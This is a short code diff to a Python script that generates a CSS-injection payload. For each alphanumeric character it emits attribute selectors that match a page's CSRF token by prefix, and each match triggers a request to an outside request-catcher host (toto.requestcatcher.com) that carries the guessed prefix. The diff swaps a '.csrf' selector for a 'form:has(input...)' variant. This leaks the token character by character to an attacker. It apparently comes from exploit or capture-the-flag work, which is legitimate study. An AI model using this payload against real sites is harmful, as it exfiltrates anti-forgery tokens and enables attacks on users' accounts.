@@ -6,11 +6,8 @@ css = ""
 for c in filter(str.isalnum, string.printable):
     payload = f"{prefix}{c}"
     css += f"""
-.csrf[value^="{payload}"] {{
-    --starts-with-{payload}:url("https://toto.requestcatcher.com/{payload}");
-}}
-input{{
-   background: var(--starts-with-{payload},none);
+form:has(input[value^="{payload}"]) {{
+    --value:url("https://toto.requestcatcher.com/{payload}");
 }}
 """
 
